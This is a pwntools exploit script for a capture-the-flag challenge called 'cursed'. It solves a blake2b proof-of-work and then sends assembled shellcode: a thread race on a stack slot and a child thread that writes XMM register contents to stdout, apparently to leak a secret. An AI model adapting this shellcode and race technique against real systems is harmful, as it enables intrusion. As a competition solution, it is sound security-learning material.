from pwn import *
from pyblake2 import blake2b

# context.log_level = 'debug'
context.arch = 'amd64'

# TARGET = './cursed'
TARGET = './edit'
HOST = 'cursed.challenges.ooo'
PORT = 29696

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    # script += "set follow-fork-mode parent\n"
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0xa0c8, 0x608e, 0x7118])

def solve_pow(inp):
    cnt = 1
    while(1):
        h = blake2b(digest_size=16)
        seed = p64(cnt).ljust(0x30, '\x00')
        h.update(inp+seed)
        output = int(h.hexdigest()[:6], 16) 
        # print cnt, hex(output)
        if (output & 0xffffff) == 0:
            break
        cnt += 1
        if cnt > 0x10000000000000000:
            exit() 
    print "FIND:", cnt, h.hexdigest()
    return seed

hash_head = r.recv(0x10) 
if args.R:
    ans = solve_pow(hash_head) 
    r.send(ans)

else:
    # ans = solve_pow(hash_head) 
    # r.send(ans)
    r.send("A"*0x30)

dump_bozo = asm('''
    mov rsi, r13
    mov rdi, 1
    mov rax, 1
    mov rdx, 0x1000
    syscall
''')

main_thread = asm('''
    mov rsi, rsp
    sub rsi, 0x10c8

    mov rax, r13
    add rax, 0x400
    mov rbx, 1

    add r13, 0xff8
    mov [r13], rbx

_race_loop:
    mov [rsi], rax
    jmp _race_loop
''')

child_thread = asm('''
    mov rsi, rsp
    movdqu [rsi], xmm4
    sub rsi, 0x10
    movdqu [rsi], xmm3
    sub rsi, 0x10
    movdqu [rsi], xmm2
    sub rsi, 0x10
    movdqu [rsi], xmm1
    sub rsi, 0x10
    movdqu [rsi], xmm0
    mov rdx, 0x50
    mov rdi, 1
    mov rax, rdi
    syscall
_loop:
    nop
    jmp _loop
''')

payload = main_thread
payload = payload.ljust(0x400, '\xcc')
payload += child_thread
payload = payload.ljust(0x1000, '\xcc')

r.send(payload)
# binary = r.recv(0x1000)
# with open('./bozo.bin', 'wb') as f:
    # f.write(binary)

r.interactive()
r.close()
